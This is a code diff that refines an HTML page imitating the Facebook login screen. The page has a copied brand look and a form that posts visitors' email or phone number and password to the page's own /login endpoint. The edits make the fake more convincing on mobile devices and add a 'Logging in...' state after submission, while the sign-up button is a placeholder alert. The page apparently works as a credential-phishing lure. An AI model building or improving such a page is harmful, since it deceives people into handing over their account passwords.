@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log in to Facebook</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook - Log In</title>
     <style>
         * {
             margin: 0;
@@ -17,10 +17,11 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            padding: 20px;
         }
         .container {
             background: #fff;
-            padding: 20px 28px;
+            padding: 20px 28px 28px;
             border-radius: 8px;
             width: 100%;
             max-width: 400px;
@@ -35,7 +36,7 @@
             height: auto;
         }
         .form-group {
-            margin-bottom: 14px;
+            margin-bottom: 12px;
         }
         .form-group input {
             width: 100%;
@@ -44,12 +45,17 @@
             border: 1px solid #dddfe2;
             border-radius: 6px;
             font-size: 16px;
-            transition: border-color 0.3s;
+            outline: none;
+            transition: border-color 0.3s, background 0.3s;
+            -webkit-appearance: none;
         }
         .form-group input:focus {
-            outline: none;
             border-color: #1877f2;
             background: #fff;
+        }
+        .form-group input::placeholder {
+            color: #8a8d91;
+            font-size: 15px;
         }
         .login-btn {
             width: 100%;
@@ -61,15 +67,19 @@
             font-size: 20px;
             font-weight: 700;
             cursor: pointer;
-            transition: background 0.3s;
-            margin-top: 4px;
+            transition: background 0.3s, opacity 0.2s;
+            margin-top: 6px;
+            touch-action: manipulation;
+        }
+        .login-btn:active {
+            opacity: 0.9;
         }
         .login-btn:hover {
             background: #166fe5;
         }
         .links {
             text-align: center;
-            margin-top: 16px;
+            margin-top: 14px;
             font-size: 14px;
         }
         .links a {
@@ -80,7 +90,7 @@
             text-decoration: underline;
         }
         .divider {
-            margin: 20px 0;
+            margin: 18px 0 16px;
             border-top: 1px solid #dadde1;
         }
         .signup-btn {
@@ -90,32 +100,59 @@
             border: none;
             border-radius: 6px;
             color: #fff;
-            font-size: 18px;
+            font-size: 17px;
             font-weight: 700;
             cursor: pointer;
             transition: background 0.3s;
+            touch-action: manipulation;
+        }
+        .signup-btn:active {
+            opacity: 0.9;
         }
         .signup-btn:hover {
             background: #36a420;
         }
         .forgot-link {
             display: block;
-            margin-top: 12px;
-        }
-        .error-msg {
-            color: #f02849;
-            font-size: 14px;
-            text-align: center;
             margin-top: 10px;
-            display: none;
+        }
+        .page-link {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 13px;
+            color: #8a8d91;
+        }
+        .page-link a {
+            color: #8a8d91;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .page-link a:hover {
+            text-decoration: underline;
         }
         @media (max-width: 480px) {
             .container {
-                padding: 16px;
+                padding: 16px 16px 20px;
                 margin: 10px;
             }
             .logo svg {
                 width: 180px;
+            }
+            .form-group input {
+                padding: 12px 14px;
+                font-size: 15px;
+            }
+            .login-btn, .signup-btn {
+                padding: 12px;
+                font-size: 17px;
+            }
+        }
+        @media (max-width: 380px) {
+            .logo svg {
+                width: 150px;
+            }
+            .container {
+                padding: 12px 12px 16px;
             }
         }
     </style>
@@ -124,17 +161,17 @@
     <div class="container">
         <div class="logo">
             <svg viewBox="0 0 300 60" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <text x="0" y="42" font-family="Arial, Helvetica, sans-serif" font-size="40" font-weight="900" fill="#1877f2">Facebook</text>
+                <text x="0" y="42" font-family="Arial, Helvetica, sans-serif" font-size="42" font-weight="900" fill="#1877f2">Facebook</text>
                 <circle cx="20" cy="30" r="8" fill="#1877f2"/>
                 <circle cx="20" cy="20" r="6" fill="#fff"/>
             </svg>
         </div>
-        <form id="loginForm" method="POST" action="/login">
+        <form id="loginForm" method="POST" action="/login" autocomplete="off">
             <div class="form-group">
-                <input type="text" name="email" placeholder="Email address or phone number" required>
+                <input type="text" name="email" placeholder="Email address or phone number" required autocomplete="email">
             </div>
             <div class="form-group">
-                <input type="password" name="password" placeholder="Password" required>
+                <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
             </div>
             <button type="submit" class="login-btn">Log In</button>
             <div class="links">
@@ -143,8 +180,8 @@
         </form>
         <div class="divider"></div>
         <button class="signup-btn" onclick="alert('Sign up functionality is currently unavailable')">Create new account</button>
-        <div style="text-align:center; margin-top:16px; font-size:13px; color:#8a8d91;">
-            <a href="#" style="color:#8a8d91; text-decoration:none;">Create a Page</a> for a celebrity, brand or business.
+        <div class="page-link">
+            <a href="#">Create a Page</a> for a celebrity, brand or business.
         </div>
     </div>
     <script>
@@ -152,6 +189,7 @@
             const btn = this.querySelector('.login-btn');
             btn.textContent = 'Logging in...';
             btn.disabled = true;
+            btn.style.opacity = '0.7';
         });
     </script>
 </body>
